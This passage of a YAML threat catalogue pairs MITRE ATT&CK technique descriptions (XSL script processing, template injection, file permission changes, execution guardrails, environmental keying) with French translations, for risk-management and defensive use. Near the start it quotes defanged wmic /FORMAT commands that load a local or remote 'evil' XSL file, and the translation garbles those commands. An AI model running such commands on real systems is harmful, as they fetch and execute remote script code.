          \ Squiblydoo \xBB, exploite un outil Windows int\xE9gr\xE9 de confiance.\
          \ Les adversaires peuvent abuser de tout alias dans [Windows Management\
          \ Instrumentation](https://attack.mitre.org/techniques/T1047) \xE0 condition\
          \ d\u2019utiliser le commutateur /FORMAT. (Citation : D\xE9rivation XSL\
          \ mars 2019)\n\nExemples en ligne de commande : (Citation : XSL Bypass mars\
          \ 2019) (Citation : LOLBAS Wmic)\n\n* Fichier local : <code>liste de processus\
          \ wmic /FORMAT\_:evil[.]XSL</code>\n* Fichier distant : <code>wmic os get\
          \ /FORMAT\_:\"https[\_:]//example[.]com/evil[.]XSL \xBB</code>\nhttps://attack.mitre.org/techniques/T1220"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1221
    ref_id: T1221
    name: Template Injection
    description: "Adversaries may create or modify references in user document templates\
      \ to conceal malicious code or force authentication attempts. For example, Microsoft\u2019\
      s Office Open XML (OOXML) specification defines an XML-based format for Office\
      \ documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls,\
      \ .ppt). OOXML files are packed together ZIP archives compromised of various\
      \ XML files, referred to as parts, containing properties that collectively define\
      \ how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties\
      \ within parts may reference shared public resources accessed via online URLs.\
      \ For example, template properties may reference a file, serving as a pre-formatted\
      \ document blueprint, that is fetched when the document is loaded.\n\nAdversaries\
      \ may abuse these templates to initially conceal malicious code to be executed\
      \ via user documents. Template references injected into a document may enable\
      \ malicious payloads to be fetched and executed when the document is loaded.(Citation:\
      \ SANS Brian Wiltse Template Injection) These documents can be delivered via\
      \ other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and\
      \ may evade static detections since no typical indicators (VBA macro, script,\
      \ etc.) are present until after the malicious payload is fetched.(Citation:\
      \ Redxorblue Remote Template Injection) Examples have been seen in the wild\
      \ where template injection was used to load malicious code containing an exploit.(Citation:\
      \ MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the\
      \ <code>*\\template</code> control word within an .rtf file to similarly conceal\
      \ then download malicious code. This legitimate control word value is intended\
      \ to be a file destination of a template file resource that is retrieved and\
      \ loaded when an .rtf file is opened. However, adversaries may alter the bytes\
      \ of an existing .rtf file to insert a template control word field to include\
      \ a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation:\
      \ Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable\
      \ [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting\
      \ a SMB/HTTPS (or other credential prompting) URL and triggering an authentication\
      \ attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template\
      \ Injection July 2017)(Citation: ryhanson phishery SEPT 2016)\nhttps://attack.mitre.org/techniques/T1221"
    translations:
      fr:
        name: Injection de gabarit
        description: "Les adversaires peuvent cr\xE9er ou modifier des r\xE9f\xE9\
          rences dans les mod\xE8les de documents utilisateur pour dissimuler un code\
          \ malveillant ou forcer des tentatives d\u2019authentification. Par exemple,\
          \ la sp\xE9cification Office Open XML (OOXML) de Microsoft d\xE9finit un\
          \ format bas\xE9 sur XML pour les documents Office (.docx, xlsx, .pptx)\
          \ afin de remplacer les anciens formats binaires (.doc, .xls, .ppt). Les\
          \ fichiers OOXML sont regroup\xE9s par des archives ZIP compos\xE9es de\
          \ divers fichiers XML, appel\xE9s parties, contenant des propri\xE9t\xE9\
          s qui d\xE9finissent collectivement la mani\xE8re dont un document est rendu.\
          \ (Citation : Microsoft Open XML juillet 2017)\n\nLes propri\xE9t\xE9s dans\
          \ certaines parties peuvent faire r\xE9f\xE9rence \xE0 des ressources publiques\
          \ partag\xE9es accessibles via des URL en ligne. Par exemple, les propri\xE9\
          t\xE9s du mod\xE8le peuvent faire r\xE9f\xE9rence \xE0 un fichier, servant\
          \ de plan de document pr\xE9format\xE9, qui est r\xE9cup\xE9r\xE9 lors du\
          \ chargement du document.\n\nLes adversaires peuvent abuser de ces mod\xE8\
          les pour dissimuler initialement du code malveillant \xE0 ex\xE9cuter via\
          \ des documents utilisateurs. Les r\xE9f\xE9rences mod\xE8les inject\xE9\
          es dans un document peuvent permettre de r\xE9cup\xE9rer et d\u2019ex\xE9\
          cuter des charges utiles malveillantes lors du chargement du document. (Citation\
          \ : Injection de gabarit SANS Brian Wiltse) Ces documents peuvent \xEAtre\
          \ livr\xE9s via d\u2019autres techniques telles que [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ et/ou [Taint Shared Content](https://attack.mitre.org/techniques/T1080)\
          \ et peuvent \xE9chapper aux d\xE9tections statiques puisqu\u2019aucun indicateur\
          \ typique (macro VBA, script, etc.) n\u2019est pr\xE9sent avant que la charge\
          \ utile malveillante ne soit r\xE9cup\xE9r\xE9e. (Citation : Injection de\
          \ gabarit \xE0 distance Redxorblue) Des exemples ont \xE9t\xE9 observ\xE9\
          s dans la nature o\xF9 l\u2019injection de mod\xE8les a \xE9t\xE9 utilis\xE9\
          e pour charger du code malveillant contenant une faille. (Citation : Injection\
          \ de mod\xE8les MalwareBytes OCT 2017)\n\nLes adversaires peuvent \xE9galement\
          \ modifier le <code>mot de contr\xF4le *\\template</code> dans un fichier\
          \ .rtf afin de dissimuler puis t\xE9l\xE9charger de la m\xEAme mani\xE8\
          re un code malveillant. Cette valeur l\xE9gitime de mot de contr\xF4le est\
          \ destin\xE9e \xE0 \xEAtre une destination de fichier d\u2019une ressource\
          \ de fichier mod\xE8le qui est r\xE9cup\xE9r\xE9e et charg\xE9e lors de\
          \ l\u2019ouverture d\u2019un fichier .rtf. Cependant, les adversaires peuvent\
          \ modifier les octets d\u2019un fichier .rtf existant pour ins\xE9rer un\
          \ champ de mot de contr\xF4le mod\xE8le afin d\u2019inclure une ressource\
          \ URL d\u2019une charge utile malveillante. (Citation : Injection RTF Proofpoint)(Citation\
          \ : Ciberseguridad D\xE9codant des fichiers RTF malveillants)\n\nCette technique\
          \ peut \xE9galement permettre l'[Authentification forc\xE9e](https://attack.mitre.org/techniques/T1187)\
          \ en injectant une URL SMB/HTTPS (ou une autre demande d\u2019identifiants)\
          \ et en d\xE9clenchant une tentative d\u2019authentification. (Citation\
          \ : Injection de gabarit d\u2019anomalie MARS 2018)(Citation : Injection\
          \ de gabarit Talos juillet 2017)(Citation : ryhanson phishery SEPT. 2016)\n\
          https://attack.mitre.org/techniques/T1221"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222
    ref_id: T1222
    name: File and Directory Permissions Modification
    description: "Adversaries may modify file or directory permissions/attributes\
      \ to evade access control lists (ACLs) and access protected files.(Citation:\
      \ Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)\
      \ File and directory permissions are commonly managed by ACLs configured by\
      \ the file or directory owner, or users with the appropriate permissions. File\
      \ and directory ACL implementations vary by platform, but generally explicitly\
      \ designate which users or groups can perform which actions (read, write, execute,\
      \ etc.).\n\nModifications may include changing specific access rights, which\
      \ may require taking ownership of a file or directory and/or elevated permissions\
      \ depending on the file or directory\u2019s existing permissions. This may enable\
      \ malicious activity such as modifying, replacing, or deleting specific files\
      \ or directories. Specific file and directory modifications may be a required\
      \ step for many techniques, such as establishing Persistence via [Accessibility\
      \ Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization\
      \ Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration\
      \ Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking\
      \ other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\
      \nAdversaries may also change permissions of symbolic links. For example, malware\
      \ (particularly ransomware) may modify symbolic links and associated settings\
      \ to enable access to files from local shortcuts with remote paths.(Citation:\
      \ new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation:\
      \ blackmatter_blackcat)(Citation: fsutil_behavior)\nhttps://attack.mitre.org/techniques/T1222"
    translations:
      fr:
        name: "Modification des permissions de fichiers et d\u2019annuaires"
        description: "Les adversaires peuvent modifier les permissions/attributs des\
          \ fichiers ou des r\xE9pertoires pour contourner les listes de contr\xF4\
          le d\u2019acc\xE8s (ACL) et acc\xE9der \xE0 des fichiers prot\xE9g\xE9s.\
          \ (Citation : Analyse hybride Icacls 1er juin 2018)(Citation : Analyse hybride\
          \ Icacls2 mai 2018) Les permissions de fichiers et de r\xE9pertoires sont\
          \ g\xE9n\xE9ralement g\xE9r\xE9es par des ACL configur\xE9es par le propri\xE9\
          taire du fichier ou du r\xE9pertoire, ou par des utilisateurs disposant\
          \ des autorisations appropri\xE9es. Les impl\xE9mentations des ACL de fichiers\
          \ et de r\xE9pertoires varient selon la plateforme, mais d\xE9signent g\xE9\
          n\xE9ralement explicitement quels utilisateurs ou groupes peuvent effectuer\
          \ quelles actions (lecture, \xE9criture, ex\xE9cution, etc.).\n\nLes modifications\
          \ peuvent inclure la modification de droits d\u2019acc\xE8s sp\xE9cifiques,\
          \ ce qui peut n\xE9cessiter la prise de propri\xE9t\xE9 d\u2019un fichier\
          \ ou d\u2019un r\xE9pertoire et/ou l\u2019augmentation des permissions selon\
          \ les autorisations existantes du fichier ou du r\xE9pertoire. Cela peut\
          \ permettre des activit\xE9s malveillantes telles que la modification, le\
          \ remplacement ou la suppression de fichiers ou de r\xE9pertoires sp\xE9\
          cifiques. Des modifications sp\xE9cifiques de fichiers et de r\xE9pertoires\
          \ peuvent \xEAtre une \xE9tape n\xE9cessaire pour de nombreuses techniques,\
          \ telles que l\u2019\xE9tablissement de la persistance via [Fonctionnalit\xE9\
          s d\u2019accessibilit\xE9](https://attack.mitre.org/techniques/T1546/008),\
          \ [scripts d\u2019initialisation de d\xE9marrage ou de connexion](https://attack.mitre.org/techniques/T1037),\
          \ [modification de configuration du shell Unix](https://attack.mitre.org/techniques/T1546/004),\
          \ ou la contamination/d\xE9tournement d\u2019autres fichiers binaires/de\
          \ configuration instrumentaux via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\
          \nLes adversaires peuvent \xE9galement modifier les permissions des liens\
          \ symboliques. Par exemple, les logiciels malveillants (en particulier les\
          \ ransomwares) peuvent modifier des liens symboliques et des param\xE8tres\
          \ associ\xE9s pour permettre l\u2019acc\xE8s aux fichiers depuis des raccourcis\
          \ locaux avec des chemins distants. (Citation : new_rust_based_ransomware)(Citation\
          \ : bad_luck_blackcat)(Citation : falconoverwatch_blackcat_attack)(Citation\
          \ : blackmatter_blackcat)(Citation : fsutil_behavior)\nhttps://attack.mitre.org/techniques/T1222"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222.001
    ref_id: T1222.001
    name: Windows Permissions
    description: 'Adversaries may modify file or directory permissions/attributes
      to evade access control lists (ACLs) and access protected files.(Citation: Hybrid
      Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File
      and directory permissions are commonly managed by ACLs configured by the file
      or directory owner, or users with the appropriate permissions. File and directory
      ACL implementations vary by platform, but generally explicitly designate which
      users or groups can perform which actions (read, write, execute, etc.).


      Windows implements file and directory ACLs as Discretionary Access Control Lists
      (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs
      identifies the accounts that are allowed or denied access to a securable object.
      When an attempt is made to access a securable object, the system checks the
      access control entries in the DACL in order. If a matching entry is found, access
      to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access
      Control Lists May 2018)


      Adversaries can interact with the DACLs using built-in Windows commands, such
      as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher
      permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      provides cmdlets that can be used to retrieve or modify file and directory DACLs.
      Specific file and directory modifications may be a required step for many techniques,
      such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008),
      [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037),
      or tainting/hijacking other instrumental binary/configuration files via [Hijack
      Execution Flow](https://attack.mitre.org/techniques/T1574).

      https://attack.mitre.org/techniques/T1222/001'
    translations:
      fr:
        name: Windows Permissions
        description: "Les adversaires peuvent modifier les permissions/attributs des\
          \ fichiers ou des r\xE9pertoires pour contourner les listes de contr\xF4\
          le d\u2019acc\xE8s (ACL) et acc\xE9der \xE0 des fichiers prot\xE9g\xE9s.\
          \ (Citation : Analyse hybride Icacls 1er juin 2018)(Citation : Analyse hybride\
          \ Icacls2 mai 2018) Les permissions de fichiers et de r\xE9pertoires sont\
          \ g\xE9n\xE9ralement g\xE9r\xE9es par des ACL configur\xE9es par le propri\xE9\
          taire du fichier ou du r\xE9pertoire, ou par des utilisateurs disposant\
          \ des autorisations appropri\xE9es. Les impl\xE9mentations des ACL de fichiers\
          \ et de r\xE9pertoires varient selon la plateforme, mais d\xE9signent g\xE9\
          n\xE9ralement explicitement quels utilisateurs ou groupes peuvent effectuer\
          \ quelles actions (lecture, \xE9criture, ex\xE9cution, etc.).\n\nWindows\
          \ impl\xE9mente les ACL de fichiers et d\u2019annuaires sous forme de listes\
          \ de contr\xF4le d\u2019acc\xE8s discr\xE9tionnaires (DACL). (Citation :\
          \ Microsoft DACL mai 2018) \xC0 l\u2019instar d\u2019une ACL standard, les\
          \ DACLs identifient les comptes qui sont autoris\xE9s ou refus\xE9s d\u2019\
          acc\xE9der \xE0 un objet s\xE9curis\xE9. Lorsqu\u2019une tentative d\u2019\
          acc\xE8s \xE0 un objet s\xE9curis\xE9 est faite, le syst\xE8me v\xE9rifie\
          \ les entr\xE9es de contr\xF4le d\u2019acc\xE8s dans le DACL dans l\u2019\
          ordre. Si une entr\xE9e correspondante est trouv\xE9e, l\u2019acc\xE8s \xE0\
          \ l\u2019objet est accord\xE9. Sinon, l\u2019acc\xE8s est refus\xE9. (Citation\
          \ : Microsoft Access Control Lists mai 2018)\n\nLes adversaires peuvent\
          \ interagir avec les DACL \xE0 l\u2019aide de commandes int\xE9gr\xE9es\
          \ \xE0 Windows, telles que \xAB icacls \xBB, \xAB cacls \xBB, \xAB takeown\
          \ \xBB et \xAB attrib \xBB, qui peuvent accorder aux adversaires des permissions\
          \ plus \xE9lev\xE9es sur des fichiers et dossiers sp\xE9cifiques. De plus,\
          \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) fournit des\
          \ cmdlets pouvant \xEAtre utilis\xE9s pour r\xE9cup\xE9rer ou modifier les\
          \ DACLs de fichiers et de r\xE9pertoires. Des modifications sp\xE9cifiques\
          \ de fichiers et de r\xE9pertoires peuvent \xEAtre une \xE9tape n\xE9cessaire\
          \ pour de nombreuses techniques, telles que l\u2019\xE9tablissement de la\
          \ persistance via [Fonctionnalit\xE9s d\u2019accessibilit\xE9](https://attack.mitre.org/techniques/T1546/008),\
          \ [scripts d\u2019initialisation de d\xE9marrage ou de connexion](https://attack.mitre.org/techniques/T1037),\
          \ ou la contamination/d\xE9tournement d\u2019autres fichiers binaires/de\
          \ configuration instrumentaux via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\
          https://attack.mitre.org/techniques/T1222/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222.002
    ref_id: T1222.002
    name: Linux and Mac Permissions
    description: "Adversaries may modify file or directory permissions/attributes\
      \ to evade access control lists (ACLs) and access protected files.(Citation:\
      \ Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)\
      \ File and directory permissions are commonly managed by ACLs configured by\
      \ the file or directory owner, or users with the appropriate permissions. File\
      \ and directory ACL implementations vary by platform, but generally explicitly\
      \ designate which users or groups can perform which actions (read, write, execute,\
      \ etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission\
      \ groups (user, group, and other) and a standard set of permissions (read, write,\
      \ and execute) that are applied to each group. While nuances of each platform\u2019\
      s permissions implementation may vary, most of the platforms provide two primary\
      \ commands used to manipulate file and directory ACLs: <code>chown</code> (short\
      \ for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial\
      \ may use these commands to make themselves the owner of files and directories\
      \ or change the mode if current permissions allow it. They could subsequently\
      \ lock others out of the file. Specific file and directory modifications may\
      \ be a required step for many techniques, such as establishing Persistence via\
      \ [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004)\
      \ or tainting/hijacking other instrumental binary/configuration files via [Hijack\
      \ Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS\
      \ Common Tools and Techniques)\nhttps://attack.mitre.org/techniques/T1222/002"
    translations:
      fr:
        name: Autorisations Linux et Mac
        description: "Les adversaires peuvent modifier les permissions/attributs des\
          \ fichiers ou des r\xE9pertoires pour contourner les listes de contr\xF4\
          le d\u2019acc\xE8s (ACL) et acc\xE9der \xE0 des fichiers prot\xE9g\xE9s.\
          \ (Citation : Analyse hybride Icacls 1er juin 2018)(Citation : Analyse hybride\
          \ Icacls2 mai 2018) Les permissions de fichiers et de r\xE9pertoires sont\
          \ g\xE9n\xE9ralement g\xE9r\xE9es par des ACL configur\xE9es par le propri\xE9\
          taire du fichier ou du r\xE9pertoire, ou par des utilisateurs disposant\
          \ des autorisations appropri\xE9es. Les impl\xE9mentations des ACL de fichiers\
          \ et de r\xE9pertoires varient selon la plateforme, mais d\xE9signent g\xE9\
          n\xE9ralement explicitement quels utilisateurs ou groupes peuvent effectuer\
          \ quelles actions (lecture, \xE9criture, ex\xE9cution, etc.).\n\nLa plupart\
          \ des plateformes Linux et bas\xE9es sur Linux fournissent un ensemble standard\
          \ de groupes de permissions (utilisateur, groupe et autres) ainsi qu\u2019\
          un ensemble standard de permissions (lire, \xE9crire et ex\xE9cuter) qui\
          \ sont appliqu\xE9es \xE0 chaque groupe. Bien que les nuances de l\u2019\
          impl\xE9mentation des permissions de chaque plateforme puissent varier,\
          \ la plupart des plateformes fournissent deux commandes principales utilis\xE9\
          es pour manipuler les ACL de fichiers et de r\xE9pertoires : <code>chown</code>\
          \ (abr\xE9viation de propri\xE9taire du changement) et <code>chmod</code>\
          \ (abr\xE9viation de mode change).\n\nLes adversaires peuvent utiliser ces\
          \ commandes pour se faire propri\xE9taire de fichiers et de r\xE9pertoires\
          \ ou changer de mode si les permissions actuelles le permettent. Ils pourraient\
          \ ensuite bloquer d\u2019autres personnes hors du dossier. Des modifications\
          \ sp\xE9cifiques de fichiers et de r\xE9pertoires peuvent \xEAtre une \xE9\
          tape n\xE9cessaire pour de nombreuses techniques, telles que l\u2019\xE9\
          tablissement de la persistance via [Modification de configuration du shell\
          \ Unix](https://attack.mitre.org/techniques/T1546/004) ou la contamination/d\xE9\
          tournement d\u2019autres fichiers binaires/de configuration instrumentaux\
          \ via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\
          \ (Citation : 20 outils et techniques courants sur macOS)\nhttps://attack.mitre.org/techniques/T1222/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1480
    ref_id: T1480
    name: Execution Guardrails
    description: "Adversaries may use execution guardrails to constrain execution\
      \ or actions based on adversary supplied and environment specific conditions\
      \ that are expected to be present on the target. Guardrails ensure that a payload\
      \ only executes against an intended target and reduces collateral damage from\
      \ an adversary\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values\
      \ an adversary can provide about a target system or environment to use as guardrails\
      \ may include specific network share names, attached physical devices, files,\
      \ joined Active Directory (AD) domains, and local/external IP addresses.(Citation:\
      \ FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of\
      \ capabilities in environments that are not intended to be compromised or operated\
      \ within. This use of guardrails is distinct from typical [Virtualization/Sandbox\
      \ Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox\
      \ Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for\
      \ known sandbox values and continuing with execution only if there is no match,\
      \ the use of guardrails will involve checking for an expected target-specific\
      \ value and only continuing with execution if there is such a match.\n\nAdversaries\
      \ may identify and block certain user-agents to evade defenses and narrow the\
      \ scope of their attack to victims and platforms on which it will be most effective.\
      \ A user-agent self-identifies data such as a user's software application, operating\
      \ system, vendor, and version. Adversaries may check user-agents for operating\
      \ system identification and then only serve malware for the exploitable software\
      \ while ignoring all other operating systems.(Citation: Trellix-Qakbot)\nhttps://attack.mitre.org/techniques/T1480"
    translations:
      fr:
        name: "Rampes d\u2019ex\xE9cution"
        description: "Les adversaires peuvent utiliser des garde-fous d\u2019ex\xE9\
          cution pour contraindre l\u2019ex\xE9cution ou les actions en fonction des\
          \ conditions sp\xE9cifiques fournies par l\u2019adversaire et des conditions\
          \ sp\xE9cifiques \xE0 l\u2019environnement qui devraient \xEAtre pr\xE9\
          sentes sur la cible. Les garde-corps garantissent qu\u2019une charge utile\
          \ ne s\u2019ex\xE9cute que contre une cible pr\xE9vue et r\xE9duisent les\
          \ dommages collat\xE9raux caus\xE9s par la campagne adverse. (Citation :\
          \ FireEye Kevin Mandia Guardsrails) Les valeurs qu\u2019un adversaire peut\
          \ fournir concernant un syst\xE8me ou un environnement cible \xE0 utiliser\
          \ comme garde-fous peuvent inclure des noms sp\xE9cifiques de partage r\xE9\
          seau, des p\xE9riph\xE9riques physiques attach\xE9s, des fichiers, des domaines\
          \ Active Directory (AD) joints, et des adresses IP locales/externes. (Citation\
          \ : FireEye Outlook d\xE9c. 2019)\n\nLes garde-corps peuvent \xEAtre utilis\xE9\
          s pour emp\xEAcher l\u2019exposition de capacit\xE9s dans des environnements\
          \ qui ne sont pas destin\xE9s \xE0 \xEAtre compromis ou utilis\xE9s. Cette\
          \ utilisation de garde-corps est distincte de la [Virtualisation/\xC9vasion\
          \ bac \xE0 sable](https://attack.mitre.org/techniques/T1497). Alors que\
          \ l\u2019utilisation de [Virtualisation/\xC9vasion bac \xE0 sable](https://attack.mitre.org/techniques/T1497)\
          \ peut impliquer de v\xE9rifier les valeurs connues du bac \xE0 sable et\
          \ de ne poursuivre l\u2019ex\xE9cution que s\u2019il n\u2019y a pas de correspondance,\
          \ l\u2019utilisation de garde-fous implique de v\xE9rifier une valeur sp\xE9\
          cifique \xE0 la cible attendue et de ne poursuivre l\u2019ex\xE9cution que\
          \ s\u2019il y a une telle correspondance.\n\nLes adversaires peuvent identifier\
          \ et bloquer certains agents utilisateurs pour contourner les d\xE9fenses\
          \ et restreindre la port\xE9e de leur attaque aux victimes et plateformes\
          \ sur lesquelles elle sera la plus efficace. Un agent utilisateur s\u2019\
          identifie lui-m\xEAme des donn\xE9es telles que l\u2019application logicielle,\
          \ le syst\xE8me d\u2019exploitation, le fournisseur et la version de l\u2019\
          utilisateur. Les adversaires peuvent v\xE9rifier les agents utilisateurs\
          \ pour identifier le syst\xE8me d\u2019exploitation, puis ne servir que\
          \ des logiciels malveillants pour le logiciel exploitable en ignorant tous\
          \ les autres syst\xE8mes d\u2019exploitation. (Citation : Trellix-Qakbot)\n\
          https://attack.mitre.org/techniques/T1480"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1480.001
    ref_id: T1480.001
    name: Environmental Keying
    description: 'Adversaries may environmentally key payloads or other features of
      malware to evade defenses and constraint execution to a specific target environment.
      Environmental keying uses cryptography to constrain execution or actions based
      on adversary supplied environment specific conditions that are expected to be
      present on the target. Environmental keying is an implementation of [Execution
      Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic
      techniques for deriving encryption/decryption keys from specific types of values
      in a given computing environment.(Citation: EK Clueless Agents)


      Values can be derived from target-specific elements and used to generate a decryption
      key for an encrypted payload. Target-specific values can be derived from specific
      network shares, physical devices, software/software versions, files, joined
      AD domains, system time, and local/external IP addresses.(Citation: Kaspersky
      Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding
      Malware Analysis)(Citation: Environmental Keyed HTA) By generating the decryption
      keys from target-specific environmental values, environmental keying can make
      sandbox detection, anti-virus detection, crowdsourcing of information, and reverse
      engineering difficult.(Citation: Kaspersky Gauss Whitepaper) These difficulties
      can slow down the incident response process and help adversaries hide their
      tactics, techniques, and procedures (TTPs).


      Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027),
      adversaries may use environmental keying to help protect their TTPs and evade
      detection. Environmental keying may be used to deliver an encrypted payload
      to the target that will use target-specific values to decrypt the payload before
      execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware
      Analysis)(Citation: Environmental Keyed HTA)(Citation: Demiguise Guardrail Router
      Logo) By utilizing target-specific values to decrypt the payload the adversary
      can avoid packaging the decryption key with the payload or sending it over a
      potentially monitored network connection. Depending on the technique for gathering
      target-specific values, reverse engineering of the encrypted payload can be
      exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used
      to prevent exposure of capabilities in environments that are not intended to
      be compromised or operated within.


      Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480),
      environmental keying can be used to prevent exposure of capabilities in environments
      that are not intended to be compromised or operated within. This activity is
      distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497).
      While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      may involve checking for known sandbox values and continuing with execution
      only if there is no match, the use of environmental keying will involve checking
      for an expected target-specific value that must match for decryption and subsequent
      execution to be successful.

      https://attack.mitre.org/techniques/T1480/001'
    translations:
      fr:
        name: "Cl\xE9 environnementale"
        description: "Les attaquants peuvent recourir au \xAB keying environnemental\
          \ \xBB pour les charges utiles ou d\u2019autres fonctionnalit\xE9s de logiciels\
          \ malveillants afin de contourner les d\xE9fenses et de limiter l\u2019\
          ex\xE9cution \xE0 un environnement cible sp\xE9cifique. Le \xAB keying environnemental\
          \ \xBB utilise la cryptographie pour restreindre l\u2019ex\xE9cution ou\
          \ les actions en fonction de conditions sp\xE9cifiques \xE0 l\u2019environnement\
          \ fournies par l\u2019attaquant et dont on s\u2019attend \xE0 ce qu\u2019\
          elles soient pr\xE9sentes sur la cible. Le \xAB keying environnemental \xBB\
          \ est une impl\xE9mentation des [Execution Guardrails](https://attack.mitre.org/techniques/T1480)\
          \ qui utilise des techniques cryptographiques pour d\xE9river des cl\xE9\
          s de chiffrement/d\xE9chiffrement \xE0 partir de types sp\xE9cifiques de\
          \ valeurs dans un environnement informatique donn\xE9. (R\xE9f\xE9rence\
          \ : EK Clueless Agents)\n\nLes valeurs peuvent \xEAtre d\xE9riv\xE9es d\u2019\
          \xE9l\xE9ments sp\xE9cifiques \xE0 la cible et utilis\xE9es pour g\xE9n\xE9\
          rer une cl\xE9 de d\xE9chiffrement pour une charge utile chiffr\xE9e. Les\
          \ valeurs sp\xE9cifiques \xE0 la cible peuvent \xEAtre d\xE9riv\xE9es de\
          \ partages r\xE9seau sp\xE9cifiques, de p\xE9riph\xE9riques physiques, de\
          \ logiciels ou de versions de logiciels, de fichiers, de domaines AD rejoints,\
          \ de l\u2019heure syst\xE8me et d\u2019adresses IP locales ou externes.\
          \ (R\xE9f\xE9rence : Livre blanc Kaspersky Gauss) (R\xE9f\xE9rence : Proofpoint\
          \ Router Malvertising) (R\xE9f\xE9rence : EK Impeding Malware Analysis)\
          \ (R\xE9f\xE9rence : Environmental Keyed HTA) En g\xE9n\xE9rant les cl\xE9\
          s de d\xE9chiffrement \xE0 partir de valeurs environnementales sp\xE9cifiques\
          \ \xE0 la cible, le chiffrement par cl\xE9 environnementale peut compliquer\
          \ la d\xE9tection en sandbox, la d\xE9tection antivirus, la collecte collaborative\
          \ d\u2019informations et la r\xE9tro-ing\xE9nierie. (R\xE9f\xE9rence : Livre\
          \ blanc Kaspersky Gauss) Ces difficult\xE9s peuvent ralentir le processus\
          \ de r\xE9ponse aux incidents et aider les attaquants \xE0 dissimuler leurs\
          \ tactiques, techniques et proc\xE9dures (TTP).\n\n\xC0 l'instar des [fichiers\
          \ ou informations obscurcis](https://attack.mitre.org/techniques/T1027),\
          \ les attaquants peuvent recourir au chiffrement par cl\xE9 environnementale\
          \ pour prot\xE9ger leurs TTP et \xE9chapper \xE0 la d\xE9tection. Le chiffrement\
          \ par cl\xE9 environnementale peut servir \xE0 transmettre \xE0 la cible\
          \ une charge utile chiffr\xE9e qui utilisera des valeurs sp\xE9cifiques\
          \ \xE0 cette cible pour la d\xE9chiffrer avant son ex\xE9cution. (R\xE9\
          f\xE9rence : Livre blanc Kaspersky Gauss) (R\xE9f\xE9rence : EK Impeding\
          \ Malware Analysis) (R\xE9f\xE9rence : Environmental Keyed HTA) (R\xE9f\xE9\
          rence : Logo du routeur Demiguise Guardrail) En utilisant des valeurs sp\xE9\
          cifiques \xE0 la cible pour d\xE9chiffrer la charge utile, l\u2019attaquant\
          \ peut \xE9viter d\u2019int\xE9grer la cl\xE9 de d\xE9chiffrement \xE0 la\
          \ charge utile ou de l\u2019envoyer via une connexion r\xE9seau susceptible\
          \ d\u2019\xEAtre surveill\xE9e. Selon la technique utilis\xE9e pour collecter\
          \ ces valeurs sp\xE9cifiques \xE0 la cible, la r\xE9tro-ing\xE9nierie de\
          \ la charge utile chiffr\xE9e peut s\u2019av\xE9rer extr\xEAmement difficile.\
          \ (R\xE9f\xE9rence : Livre blanc Kaspersky Gauss) Cette technique peut \xEA\
          tre utilis\xE9e pour emp\xEAcher la divulgation de capacit\xE9s dans des\
          \ environnements qui ne sont pas destin\xE9s \xE0 \xEAtre compromis ou exploit\xE9\
          s.\n\n\xC0 l\u2019instar d\u2019autres [m\xE9canismes de protection de l\u2019\
          ex\xE9cution](https://attack.mitre.org/techniques/T1480), l\u2019utilisation\
          \ de cl\xE9s environnementales peut servir \xE0 emp\xEAcher la divulgation\
          \ de capacit\xE9s dans des environnements qui ne sont pas cens\xE9s \xEA\
          tre compromis ou exploit\xE9s. Cette activit\xE9 se distingue des techniques\
